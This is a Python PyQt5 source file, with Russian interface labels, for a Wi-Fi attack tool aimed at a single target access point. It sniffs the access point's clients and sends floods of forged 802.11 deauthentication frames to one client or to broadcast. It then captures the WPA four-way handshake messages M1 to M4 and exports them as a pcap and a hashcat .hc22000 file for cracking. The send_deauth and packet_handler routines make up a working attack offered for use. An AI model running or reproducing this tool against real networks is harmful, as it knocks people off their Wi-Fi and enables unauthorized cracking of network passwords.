#!/usr/bin/env python3

from PyQt5.QtWidgets import (
	QApplication, QTreeView, QVBoxLayout, QHBoxLayout, QWidget, QHeaderView, QPushButton, QLabel, QProgressBar, 
	QStyledItemDelegate, QStyleOptionProgressBar, QStyle, QComboBox, QSizePolicy, QMessageBox, QDialog, QTextEdit, QFileDialog,
	QMainWindow, QTableView, QGroupBox, QFrame, QSpinBox, QCheckBox
)
from PyQt5.QtGui import QStandardItemModel, QStandardItem, QIcon, QPainter, QColor, QPen, QPainterPath, QFont, QKeyEvent
from PyQt5.QtCore import Qt, QEvent, QSize, QTimer, QObject, QMetaObject, Q_ARG, pyqtSlot

import sys
import csv
import threading
import subprocess
import signal
import json
import pcapy
import shutil

from scapy.all import *

import wifi_manager
import dot11_utils

def scale_rssi(rssi_value, min_rssi=-90, max_rssi=-40, new_min=0, new_max=100):
    return max(new_min, min(new_max, (rssi_value - min_rssi) * (new_max - new_min) / (max_rssi - min_rssi) + new_min))

class MonoFontDeligate(QStyledItemDelegate):
	def initStyleOption(self, option, index):
		super().initStyleOption(option, index)
		if index.column() == 0:
			option.font = QFont("Courier New", 9)

class ProgressBarDelegate(QStyledItemDelegate):
	def __init__(self, parent=None):
		super().__init__(parent)

	def paint(self, painter, option, index):
		if 1:
			try:
				rssi_value = int(index.data())
			except ValueError:
				return
		
			signal_strength = int(scale_rssi(rssi_value, -85, -40, 0, 100))
			padding = 6
			bar_rect = option.rect.adjusted(padding, padding, -padding, -padding)

			if option.state & QStyle.State_Selected:
				painter.fillRect(option.rect, option.palette.highlight())

			progress_option = QStyleOptionProgressBar()
			progress_option.rect = bar_rect
			progress_option.minimum = 0
			progress_option.maximum = 100
			progress_option.progress = signal_strength
			progress_option.text = f"{rssi_value} dBm"
			progress_option.textVisible = True
			progress_option.textAlignment = Qt.AlignCenter

			painter.save()
			painter.setRenderHint(QPainter.Antialiasing)
			option.widget.style().drawControl(QStyle.CE_ProgressBar, progress_option, painter)
			painter.restore()
		else:
			super().paint(painter, option, index)

	def createEditor(self, parent, option, index):
		return None

class DeauthDialog(QDialog):
	def keyPressEvent(self, event: QKeyEvent):
		print(f'Code: {event.key()}')
	
	def __init__(self, interface, bssid, channel, parent=None):
		super().__init__(parent)
		self.setFocusPolicy(Qt.StrongFocus)

		self.interrupt_flag = False
		self.first_beacon_flag = False
		
		self.key1_cnt = 0
		self.key2_cnt = 0
		self.key3_cnt = 0
		self.key4_cnt = 0
		self.st_falgs = {}
		self.packets = []
		
		self.deauth_reasons = {
			1: "Unspecified reason",
			2: "Previous authentication no longer valid",
			3: "Deauthenticated because sending station is leaving (or has left) IBSS or ESS",
			4: "Disassociated due to inactivity",
			5: "Disassociated because AP is unable to handle all currently associated stations",
			6: "Class 2 frame received from nonauthenticated station",
			7: "Class 3 frame received from nonassociated station",
			8: "Disassociated because sending station is leaving (or has left) BSS",
			9: "Station requesting (re)association is not authenticated with responding station",
			34: "Deauthenticated because of 802.1X authentication failed"
		}
		
		
		self.interface = interface
		self.bssid = bssid.lower()
		self.BSSID = self.bssid.upper()
		self.channel = channel
	
		self.stations = {}
		self.ouiDB = {}
		self.ouiCSV_Data = None
		self.load_oui_csv()
		self.ssid = None
		self.client = None
		self.CLIENT = None
		self.deauth_count = 5
		
		self.setWindowTitle("Мониторинг сети")
		
		xrandr_wxh = subprocess.check_output("xrandr | grep '*' | awk '{print $1}'", shell=True).decode()
		wh = xrandr_wxh.split('x')
		w = 1200
		h = 600
		x = round((int(wh[0]) / 2) - (w / 2))
		y = round((int(wh[1]) / 2) - (h / 2))
		
		self.setGeometry(x, y, w, h)
		self.setWindowIcon(QIcon('icons/satellite-dish.png'))
		
		self.interface_label = QLabel("<b>Interface:</b> -")
		self.bssid_label = QLabel("<b>Target:</b> -")
		self.ch_label = QLabel("<b>Channel:</b> -")
		self.ssid_label = QLabel("<b>SSID:</b> -")
		self.beacons_label = QLabel("<b>Beacons:</b> -")
		self.packetlen_label = QLabel("<b>Packets:</b> -")
		
		self.pb_layout = QHBoxLayout()
		
		self.rssi_pb = QProgressBar()		
		self.rssi_pb.setMinimum(0)
		self.rssi_pb.setMaximum(100)
		self.rssi_pb.setValue(0)
		self.rssi_pb.setFormat("- dBm")
		
		self.pb_layout.addWidget(QLabel('<b>RSSI: </b>'))
		self.pb_layout.addWidget(self.rssi_pb)
		
		status_layout = QVBoxLayout()
		status_layout.setContentsMargins(5, 5, 5, 0)	
		status_layout.addWidget(self.interface_label)
		status_layout.addWidget(self.ssid_label)
		status_layout.addWidget(self.ch_label)
		status_layout.addWidget(self.bssid_label)
		status_layout.addWidget(self.beacons_label)
		status_layout.addWidget(self.packetlen_label)
		status_layout.addLayout(self.pb_layout)
		status_layout.setContentsMargins(5, 5, 5, 5)
		
		settings_layout = QVBoxLayout()
		settings_layout.setContentsMargins(5, 5, 5, 5)
		
		self.deauth_packets_edit = QSpinBox()
		self.deauth_packets_edit.setRange(1, 500)
		self.deauth_packets_edit.setValue(127)
		deauth_packets_edit_row = QHBoxLayout()
		deauth_packets_edit_row.addWidget(QLabel('Пакетов деавторизации за раз'))
		deauth_packets_edit_row.addWidget(self.deauth_packets_edit)
		deauth_packets_edit_row.addStretch()

		self.deauth_attempts_edit = QSpinBox()
		self.deauth_attempts_edit.setRange(1, 100)
		self.deauth_attempts_edit.setValue(3)
		deauth_attempts_edit_row = QHBoxLayout()
		deauth_attempts_edit_row.addWidget(QLabel('Попыток деавторизации'))
		deauth_attempts_edit_row.addWidget(self.deauth_attempts_edit)
		deauth_attempts_edit_row.addStretch()	
		
		self.deauth_reason_combo = QComboBox()
		
		for code, text in self.deauth_reasons.items():
			self.deauth_reason_combo.addItem(f"{code} : {text}", code)
			
		index = self.deauth_reason_combo.findData(3)
		if index != -1:
			self.deauth_reason_combo.setCurrentIndex(index)
		
		deauth_reason_combo_row = QHBoxLayout()
		deauth_reason_combo_row.addWidget(QLabel('Причина деавторизации'))
		deauth_reason_combo_row.addWidget(self.deauth_reason_combo)
		deauth_reason_combo_row.addStretch()
		
		self.deauth_timeout_edit = QSpinBox()
		self.deauth_timeout_edit.setRange(1, 10)
		self.deauth_timeout_edit.setValue(3)
		deauth_timeout_edit_row = QHBoxLayout()
		deauth_timeout_edit_row.addWidget(QLabel('Максимальное время ожидания EAPOL-фрейма'))
		deauth_timeout_edit_row.addWidget(self.deauth_timeout_edit)
		deauth_timeout_edit_row.addWidget(QLabel('сек'))
		deauth_timeout_edit_row.addStretch()
		
		self.hc22000_create_checkbox = QCheckBox('Создать .hc22000 файл для hashcat (требуется hcxpcapngtool)')
		if not shutil.which('hcxpcapngtool'):
			self.hc22000_create_checkbox.setEnabled(False)
		else:
			self.hc22000_create_checkbox.setChecked(Qt.Checked)
		
		settings_layout.addLayout(deauth_packets_edit_row)
		settings_layout.addLayout(deauth_attempts_edit_row)
		settings_layout.addLayout(deauth_reason_combo_row)
		settings_layout.addLayout(deauth_timeout_edit_row)
		settings_layout.addWidget(self.hc22000_create_checkbox)
		
		frame_in_layout = QHBoxLayout()
		frame_in_layout.addLayout(status_layout, 1)
		frame_in_layout.addLayout(settings_layout, 1)
				
		frame = QFrame()
		frame.setLayout(frame_in_layout)
		frame.setFrameShape(QFrame.StyledPanel)
		
		frame_out_layout = QHBoxLayout()
		frame_out_layout.setContentsMargins(5, 5, 5, 5)
		frame_out_layout.addWidget(frame)
		
		buttons_layout = QHBoxLayout()
		self.btn_start_scan = QPushButton('Мониторинг')
		self.btn_stop_scan = QPushButton('Стоп')
		self.btn_deauth = QPushButton('Деавторизовать')
		self.btn_savepcap = QPushButton('Сохранить в .pcap')
		
		self.btn_start_scan.setIcon(QIcon('icons/refresh.png'))
		self.btn_start_scan.setIconSize(QSize(24, 24))

		self.btn_stop_scan.setIcon(QIcon('icons/cancelled.png'))
		self.btn_stop_scan.setIconSize(QSize(24, 24))
		self.btn_stop_scan.setEnabled(False)
		
		self.btn_deauth.setIcon(QIcon('icons/unlocked.png'))
		self.btn_deauth.setIconSize(QSize(24, 24))
		self.btn_deauth.clicked.connect(self.start_deauth)
		self.btn_deauth.setEnabled(False)
		
		self.btn_savepcap.setIcon(QIcon('icons/diskette.png'))
		self.btn_savepcap.setIconSize(QSize(24, 24))
		
		self.btn_start_scan.clicked.connect(self.start_monitoring_thread)
		self.btn_stop_scan.clicked.connect(self.stop_monitoring)
		self.btn_savepcap.clicked.connect(self.save_pcap)
		
		buttons_layout.addWidget(self.btn_start_scan)
		buttons_layout.addWidget(self.btn_stop_scan)
		buttons_layout.addWidget(self.btn_deauth)
		buttons_layout.addWidget(self.btn_savepcap)
		buttons_layout.addStretch()
		buttons_layout.setContentsMargins(5, 5, 5, 5)
		
		self.stations_table = QTableView(self)
		self.model = QStandardItemModel(0, 5, self)
		self.model.setHorizontalHeaderLabels(['MAC', 'RSSI', 'Frames', 'ACKs', 'Rate', 'Modulation', 'Flags'])

		self.stations_table.setModel(self.model)
		self.stations_table.horizontalHeader().setStretchLastSection(True)
		self.stations_table.setEditTriggers(QTableView.NoEditTriggers)	
		self.stations_table.setShowGrid(False)
		self.stations_table.verticalHeader().setVisible(False)
		self.stations_table.setSelectionBehavior(QTableView.SelectionBehavior.SelectRows)
		
		#self.progress_delegate = ProgressBarDelegate(self.stations_table)
		self.stations_table.setItemDelegateForColumn(1, ProgressBarDelegate(self.stations_table))
		self.stations_table.setItemDelegateForColumn(0, MonoFontDeligate(self.stations_table))
		
		self.stations_table.setIconSize(QSize(32, 32))
		
		self.stations_table.setColumnWidth(0, 200)
		self.stations_table.setColumnWidth(1, 420)
		self.stations_table.setColumnWidth(3, 55)
		self.stations_table.setColumnWidth(4, 80)
		self.stations_table.setColumnWidth(5, 180)
		
		self.log_textarea = QTextEdit()
		self.log_textarea.setFont(QFont("Courier New", 11))
		self.log_textarea.setReadOnly(True)
		
		main_layout = QVBoxLayout()
		main_layout.addLayout(frame_out_layout)
		main_layout.addLayout(buttons_layout)
		main_layout.addWidget(self.stations_table)
		main_layout.addWidget(QLabel('<b>Лог</b>'))
		main_layout.addWidget(self.log_textarea)
		main_layout.setContentsMargins(0, 0, 0, 0)
		self.setLayout(main_layout)
		
		self.set_label_item_val_text(self.interface_label, 'Interface', self.interface)
		self.set_label_item_val_text(self.bssid_label, 'Target', self.get_mac_vendor_mixed(self.bssid))
		self.set_label_item_val_text(self.ch_label, 'Channel', self.channel)
		
		self.refresh_timer = QTimer()
		self.refresh_timer.setInterval(1)
		self.refresh_timer.timeout.connect(self.refresh_oher_data)
		self.refresh_timer.start()
		
		wifi_manager.switch_iface_channel(self.interface, self.channel)
		self.beacons = 0
		signal.signal(signal.SIGINT, self.handle_interrupt)
		self.log_add(f"[+] Switching {self.interface} to channel {self.channel}")
	
	def refresh_oher_data(self):
		self.set_label_item_val_text(self.packetlen_label, 'Packets', len(self.packets))
	
	def start_deauth(self):
		selected_indexes = self.stations_table.selectionModel().selectedRows()
		if selected_indexes:
			row = selected_indexes[0].row()
			model = self.stations_table.model()
			self.client = model.data(model.index(row, 0), Qt.UserRole)
			self.CLIENT = self.client.upper()
		else:
			self.client = 'ff:ff:ff:ff:ff:ff'
			self.CLIENT = self.client.upper()
		threading.Thread(target=self.send_deauth).start()
		
	def save_pcap(self):
		if len(self.packets) > 0:
			if self.key1_cnt == 0 or self.key2_cnt == 0 or self.key3_cnt == 0 or self.key4_cnt == 0:
				QMessageBox.warning(self, "Предупреждение!", "Не собраны или отсуствует часть ключей M1-M4")
			options = QFileDialog.Options()
			file_path, _ = QFileDialog.getSaveFileName(self, "Сохранить как", f"{self.ssid}.pcap", "PCAP Files (*.pcap)", options=options)
			if file_path:
				try:
					wrpcap(file_path, self.packets)
					if self.hc22000_create_checkbox.isChecked():
						directory = os.path.dirname(file_path)
						subprocess.run(['hcxpcapngtool', '-o', f"{directory}/{self.ssid}.hc22000", file_path], capture_output=True, text=True)
				except Exception as e:
					print(e)
		else:
			QMessageBox.critical(self, "Ошибка", f"Отсутсвуют данные от {self.get_mac_vendor_mixed(self.bssid)}")
	
	def safe_log_add(self, log):
		QMetaObject.invokeMethod(self, "log_add", Qt.QueuedConnection, Q_ARG(str, log))
	
	@pyqtSlot(str)
	def log_add(self, log):
		self.log_textarea.append(log)
		self.log_textarea.moveCursor(self.log_textarea.textCursor().End)
	
	def load_oui_csv(self):
		with open('data/oui.csv', newline='', encoding='utf-8') as csvfile:
			reader = csv.reader(csvfile)
			for row in reader:
				if len(row) >= 3:
					oui = row[1].upper()
					vendor = row[2].strip()
					self.ouiDB[oui] = vendor
	
	def get_mac_vendor(self, mac):
		mac_prefix = mac.upper().replace(":", "").replace("-", "").replace(".", "")[:6]
		return self.ouiDB.get(mac_prefix, "Unknown")
	
	def get_mac_vendor_mixed(self, mac):
		if mac:
			vendor = self.get_mac_vendor(mac)
			if vendor != 'Unknown':
				return f"{vendor[:9].replace(' ', '').replace(',', '').replace('.', '')}_{mac[9:].upper()}"
			else:
				return mac.upper()
		else:
			return

	def handle_interrupt(self, signum, frame):
		self.interrupt_flag = True
		self.close()
	
	def closeEvent(self, event: QEvent):
		self.interrupt_flag = True
		self.stations = {}
		event.accept()
	
	def set_label_item_val_text(self, qLabel, item, val):
		qLabel.setText(f"<b>{item}: </b>{val}")
	
	def start_monitoring_thread(self):
		self.interrupt_flag = False
		self.btn_stop_scan.setEnabled(True)
		self.btn_start_scan.setEnabled(False)
		threading.Thread(target=self.start_monitoring).start()
		self.log_add(f"[+] Waiting beacon frame from {self.get_mac_vendor_mixed(self.bssid)}")
		
	def stop_monitoring(self):
		self.btn_stop_scan.setEnabled(False)
		self.btn_start_scan.setEnabled(True)
		self.interrupt_flag = True		
	
	def start_monitoring(self):
		sniff(iface=self.interface, prn=self.packet_handler, stop_filter=lambda pkt: (self.interrupt_flag))
	
	def safe_update_ap_ssid(self, ssid):
		QMetaObject.invokeMethod(self, "_update_ap_ssid", Qt.QueuedConnection, Q_ARG(str, ssid))
	
	def safe_update_ap_rssi(self, rssi):
		QMetaObject.invokeMethod(self, "_update_ap_rssi", Qt.QueuedConnection, Q_ARG(int, rssi))
	
	def safe_update_ap_beacons(self, beacons):
		QMetaObject.invokeMethod(self, "_update_ap_beacons", Qt.QueuedConnection, Q_ARG(int, beacons))
		
	def safe_add_station(self, json_data):
		QMetaObject.invokeMethod(self, "_add_station", Qt.QueuedConnection, Q_ARG(str, json_data))
	
	def safe_update_item_by_mac(self, mac, item, data):
		QMetaObject.invokeMethod(self, "_update_item_by_mac", Qt.QueuedConnection, Q_ARG(str, mac), Q_ARG(int, item), Q_ARG(str, data))
	
	@pyqtSlot(str)
	def _update_ap_ssid(self, ssid):
		self.ssid_label.setText(f'<b>SSID: </b>{ssid}')
	
	@pyqtSlot(int)
	def _update_ap_rssi(self, rssi):
		self.rssi_pb.setFormat(f"{rssi} dBm")
		self.rssi_pb.setValue(int(scale_rssi(rssi_value=rssi)))
	
	@pyqtSlot(int)
	def _update_ap_beacons(self, beacons):
		self.beacons_label.setText(f'<b>Beacons:</b> {beacons}')
		
	@pyqtSlot(str)
	def _add_station(self, json_data):
		rows = []
		data = json.loads(json_data)
		
		for i in range(1, len(data)):
			if i == 1:
				item = QStandardItem(QIcon('icons/signal.png'), str(data[i]))
				item.setData(data[0], Qt.UserRole)
			else:
				item = QStandardItem(str(data[i]))
			rows.append(item)
		
		rows.append(QStandardItem('-'))
		
		self.model.appendRow(rows)
		row_number = self.model.rowCount() -1
		self.stations_table.setRowHeight(row_number, 40)
	
	@pyqtSlot(str, int, str)
	def _update_item_by_mac(self, mac, item, data):
		for row in range(self.model.rowCount()):
			item_mac = self.model.item(row, 0)
			if item_mac and item_mac.text().upper() == mac.upper():
				item = self.model.item(row, item) 
				if item:
					item.setText(str(data))
					#print(data)
	
	def packet_handler(self, pkt):
		if pkt.haslayer(RadioTap):
			ap_mac = pkt.addr1
			st_mac = pkt.addr2

			if pkt.type == 1 and pkt.subtype == 13:
				if st_mac in self.stations:
					self.stations[st_mac]['acks'] += 1
					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(st_mac), 3, str(self.stations[st_mac]['acks']))
			

			if ((ap_mac == self.bssid) and (pkt.type == 1 and pkt.subtype in [8, 9])):
				signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else None
				station_Rate = pkt.Rate if hasattr(pkt, 'Rate') else '?'
				station_ChannelFlags = pkt.ChannelFlags if hasattr(pkt, 'ChannelFlags') else '?'

				if not st_mac in self.stations:
					self.stations[st_mac] = {
						'client': st_mac,
						'mac': self.get_mac_vendor_mixed(st_mac),
						'signal': signal,
						'frames': 0,
						'acks': 0,
						'rate': f"{station_Rate} mB/s",
						'modulation': str(station_ChannelFlags),
					}
					
					stations_list = list(self.stations[st_mac].values())
					stations_json = json.dumps(stations_list, default=str)
					self.safe_add_station(stations_json)
					self.stations[st_mac]['flags'] = []
				else:
					self.stations[st_mac]['signal'] = signal
					self.stations[st_mac]['rate'] = station_Rate
					self.stations[st_mac]['modulation'] = str(station_ChannelFlags)
					self.stations[st_mac]['frames'] += 1
					
					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(st_mac), 1, str(signal))
					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(st_mac), 2, str(self.stations[st_mac]['frames']))
					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(st_mac), 4, f"{self.stations[st_mac]['rate']} mB/s")
					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(st_mac), 5, self.stations[st_mac]['modulation'])
		
		if pkt.haslayer(Dot11):
			if pkt.type == 0 and pkt.subtype in [2, 12]:
				d_st_mac = pkt.addr1 if pkt.addr1 in self.stations else (pkt.addr2 if pkt.addr2 in self.stations else None)

				if d_st_mac in self.stations:
					if 'D' not in self.stations[d_st_mac]['flags'] and pkt.subtype == 12:
						self.stations[d_st_mac]['flags'].append('D')
						self.safe_update_item_by_mac(self.get_mac_vendor_mixed(d_st_mac), 6, ' '.join(self.stations[d_st_mac]['flags']))
					if 'R' not in self.stations[d_st_mac]['flags'] and pkt.subtype == 2:
						self.stations[d_st_mac]['flags'].append('R')
						self.safe_update_item_by_mac(self.get_mac_vendor_mixed(d_st_mac), 6, ' '.join(self.stations[d_st_mac]['flags']))
							
		if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3 and pkt.addr3 == self.bssid:
			raw_data = bytes(pkt[EAPOL])
			key_info = int.from_bytes(raw_data[5:7], 'big')
			eapol_st = pkt.addr1 if pkt.addr1 in self.stations else (pkt.addr2 if pkt.addr2 in self.stations else None)

			if eapol_st:
				if eapol_st in self.stations:
					if key_info == 0x008a:
						self.packets.append(pkt)
						self.key1_cnt += 1
						self.safe_log_add(f"[+] Received M1 Message from \"{self.get_mac_vendor_mixed(self.BSSID)}\"")
						if 'M1' not in self.stations[eapol_st]['flags']:
							self.stations[eapol_st]['flags'].append('M1')
					elif key_info == 0x010a:
						self.packets.append(pkt)
						self.key2_cnt += 1
						self.safe_log_add(f"[+] Received M2 Message from \"{self.get_mac_vendor_mixed(eapol_st)}\"")
						if 'M2' not in self.stations[eapol_st]['flags']:
							self.stations[eapol_st]['flags'].append('M2')
					elif key_info == 0x13ca:
						self.packets.append(pkt)
						self.key3_cnt += 1
						self.safe_log_add(f"[+] Received M3 Message from \"{self.get_mac_vendor_mixed(self.BSSID)}\"")
						if 'M3' not in self.stations[eapol_st]['flags']:
							self.stations[eapol_st]['flags'].append('M3')
					elif key_info == 0x030a:
						self.packets.append(pkt)
						self.key4_cnt += 1
						self.safe_log_add(f"[+] Received M4 Message from \"{self.get_mac_vendor_mixed(eapol_st)}\"")
						if 'M4' not in self.stations[eapol_st]['flags']:
							self.stations[eapol_st]['flags'].append('M4')
								
					self.safe_update_item_by_mac(self.get_mac_vendor_mixed(eapol_st), 6, ' '.join(self.stations[eapol_st]['flags']))
			
		if pkt.haslayer(Dot11Beacon):
			bssid = pkt.addr3
			if bssid == self.bssid:
				self.beacons += 1
				signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else None
				ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else None
				self.ssid = ssid
				channel = dot11_utils.get_channel(pkt)
				
				if not self.first_beacon_flag:
					self.first_beacon_flag = True
					self.packets.append(pkt)
					self.safe_log_add(f"[+] Done, ssid=\"{ssid}\"")
					self.btn_deauth.setEnabled(True)
					
				self.safe_update_ap_ssid(ssid)
				self.safe_update_ap_rssi(signal)
				self.safe_update_ap_beacons(self.beacons)
				
			
	def send_deauth(self):
		self.btn_deauth.setEnabled(False)
		pcap = pcapy.open_live(self.interface, 100, 1, 9)
		reason_index = self.deauth_reason_combo.currentIndex()
		reason_code = self.deauth_reason_combo.itemData(reason_index) 
		deauth_attempts = self.deauth_attempts_edit.value()

		for i in range(deauth_attempts):
			if self.client != 'ff:ff:ff:ff:ff:ff':
				self.safe_log_add(f"[+] Send deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {deauth_attempts}) (reason={reason_code})")
			else:
				self.safe_log_add(f"[+] Send deauth to broadcast as {self.BSSID} ({i +1} / {deauth_attempts}) (reason={reason_code})")
			
			for pnt_num in range(self.deauth_packets_edit.value()):
				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(pnt_num << 4)) / Dot11Deauth(reason=reason_code))
				pcap.sendpacket(deauth_pkt)
			time.sleep(1)
		self.btn_deauth.setEnabled(True)
